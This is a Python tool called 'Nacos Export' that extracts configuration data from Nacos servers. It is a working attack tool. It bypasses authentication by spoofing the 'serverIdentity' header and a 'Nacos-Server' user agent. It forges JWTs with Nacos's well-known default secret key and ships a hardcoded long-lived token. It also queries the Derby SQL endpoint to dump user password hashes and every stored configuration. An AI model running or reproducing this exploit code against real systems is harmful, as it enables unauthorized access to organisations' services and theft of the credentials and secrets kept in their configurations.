import requests
import sys
import urllib3
urllib3.disable_warnings()
import time
from email.utils import parsedate
import jwt
import base64
import argparse
import textwrap


VERSION = "v1.4.1"

BANNER =  """
 ______________
< Nacos Export >         @Author: Arm!tage
 --------------          @Version: {version}
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\\
                ||----w |         
                ||     ||

""".format(version=VERSION)


class NacosExport:
    def __init__(self, target: str) -> None:
        self.target = target
        self.token = ""
        self.proxies = dict()
        self.header = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36',
        }
        self.namespaces = list()
        self.count = 0

    def login(self, username: str, password: str):
        login_1 = "/v1/auth/users/login"
        login_2 = "/v1/auth/login"

        login_params = {
            'username': username,
            'password': password,
            'namespaceId': ''
        }

        try:
            resp = requests.post(self.target + login_1, headers=self.header, data=login_params, proxies=self.proxies, verify=False)
            if resp.status_code == 200:
                resp_json = resp.json()
                self.token = resp_json.get("accessToken")
            else:
                resp = requests.post(self.target + login_2, headers=self.header, data=login_params, proxies=self.proxies, verify=False)
                self.token = resp.headers.get("Authorization")
        except Exception:
            pass
        if self.token == "":
            print("[!] login failed.")
            exit(0)
        else:
            print("[+] Token: {}".format(self.token))

    def get_namespaces(self):
        path = "/v1/console/namespaces"
        if self.token != "":
            self.header["Authorization"] = self.token
        params = {
            'namespaceId': '',
        }
        resp = requests.get(self.target + path, headers=self.header, params=params, proxies=self.proxies, verify=False)
        if resp.status_code == 200:
            resp_dict = resp.json()
            self.namespaces = resp_dict['data']

    def dump_auth(self):
        self.get_namespaces()
        for namespace in self.namespaces:
            if namespace["configCount"] == 0:
                namespace["configCount"] = 1 
            PARAMS = {
                "search": "accurate",
                "dataId": "",
                "group": "",
                "appName": "",
                "config_tags": "",
                "pageNo": 1,
                "pageSize": namespace["configCount"],
                "tenant": namespace["namespace"],
                "namespaceId": ""
            }
            self.header["Accesstoken"] = self.token
            PARAMS["accessToken"] = self.token
            if not self.request_contents(self.header, PARAMS):
                print("[-] Token Invalid.")

    def dump_unauth(self):
        bypass_method = 1
        self.get_namespaces()
        for namespace in self.namespaces:
            if namespace["configCount"] == 0:
                namespace["configCount"] = 1 
            PARAMS = {
                "search": "accurate",
                "dataId": "",
                "group": "",
                "appName": "",
                "config_tags": "",
                "pageNo": 1,
                "pageSize": namespace["configCount"],
                "tenant": namespace["namespace"],
                "namespaceId": ""
            }
            # bypass
            if bypass_method == 1:
                if not self.request_contents(self.header, PARAMS):
                    bypass_method = 2
            if bypass_method == 2:
                self.header['serverIdentity'] = "security"
                if not self.request_contents(self.header, PARAMS):
                    del self.header['serverIdentity']
                    bypass_method = 3
            if bypass_method == 3:
                self.header['User-Agent'] = "Nacos-Server"
                if not self.request_contents(self.header, PARAMS):
                    print("[-] Cannot bypass")

    def dump_sql(self):
        # dbs_query = "select * from sys.sysschemas"
        # users_query = "select * from nacos.users"
        # content_query = "select * from nacos.config_info"
        path = "/v1/cs/ops/derby"
        p1 = {"sql": "select * from nacos.users"}
        resp = requests.get(self.target + path, headers=self.header,  params=p1, proxies=self.proxies ,verify=False)
        if resp.status_code == 200:
            resp_json = resp.json()
            if resp_json["code"] == 200:
                print("[+] USERS:")
                for user in resp_json["data"]:
                    print("Username:", user["USERNAME"])
                    print("Password:", user["PASSWORD"])

        p2 = {"sql": "select * from nacos.config_info"}
        resp = requests.get(self.target + path, headers=self.header, params=p2, proxies=self.proxies, verify=False)
        if resp.status_code == 200:
            resp_json = resp.json()
            if resp_json["code"] == 200:
                for content in resp_json["data"]:
                    self.print_output("None", content["GROUP_ID"], content["DATA_ID"], content["CONTENT"])
                    self.count += 1

    def set_token(self, token: str):
        self.token = token

    def gen_token(self, secretkey: str):
        resp = requests.get(self.target , verify=False, proxies=self.proxies)
        times = resp.headers['Date']
        times = int(time.mktime(parsedate(times)))+18000
        secret_key = base64.b64encode(secretkey.encode('utf-8')).decode('utf-8')
        payload = {
            "sub": "nacos",
            "exp": times
        }
        self.token = jwt.encode(payload, secret_key, algorithm='HS256')
        print("JWT TOKEN: ", self.token)

    def request_contents(self, header: dict, param:dict) -> bool:
        path = "/v1/cs/configs"
        resp = requests.get(self.target + path, headers=header, params=param, proxies=self.proxies, verify=False)
        if resp.status_code == 200:
            resp_json = resp.json()
            for item in resp_json["pageItems"]:
                self.print_output(param["tenant"], item["group"], item["dataId"], item["content"])
            
            return True
        else:
            return False
        
    def set_proxy(self, url: str):  
        protocol = url.split('://')[0]
        self.proxies[protocol] = url

    def print_output(self, namespace: str, group:str, dataId: str, content: str):
        print("""

##################################################
[+] Namespace: {namespace}
[+] Group: {group}
[+] DataId: {dataid}
##################################################
""".format(namespace=namespace, group=group, dataid=dataId ))
        print(content, "\n")
        self.count += 1

def main():
    parser = argparse.ArgumentParser(prog=sys.argv[0], formatter_class=argparse.RawDescriptionHelpFormatter,
    description=textwrap.dedent(BANNER))
    parser.add_argument("url", type=str, help="NACOS url, before '/v1'")
    parser.add_argument("method", type=str, help="Choice method, {login, bypass|unauth, sql, token, secretkey}")
    parser.add_argument("-u", "--username", type=str, help="NACOS username", default="nacos")
    parser.add_argument("-p", "--password", type=str, help="NACOS password", default="nacos")
    parser.add_argument("-t", "--token", type=str, help="token", default="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g")
    parser.add_argument("-sk", "--secretkey", type=str, help="secretkey", default="SecretKey012345678901234567890123456789012345678901234567890123456789")
    parser.add_argument("--proxy", type=str, help="proxy like: http://127.0.0.1:8080")
    args = parser.parse_args()


    target = args.url.rstrip('/')
    print("[+] Target:", target)
    nacos = NacosExport(target=target)
    if args.proxy != None:
        nacos.set_proxy(args.proxy)
    if args.method == "secretkey":
        print("[+] SecertKey:", args.secretkey)
        nacos.gen_token(args.secretkey)
        nacos.dump_auth()
    if args.method == "login":
        print("[+] Username:", args.username)
        print("[+] Password:", args.password)
        nacos.login(args.username, args.password)
        nacos.dump_auth()
    if args.method == "bypass" or args.method == "unauth":
        print("[*] Bypass/Unauth")
        nacos.dump_unauth()
    if args.method == "sql":
        nacos.dump_sql()
    if args.method == "token":
        print("[+] Token:", args.token)
        nacos.set_token(args.token)
        nacos.dump_auth()

    print("[+] Count: ", nacos.count)


if __name__ == '__main__':
    main()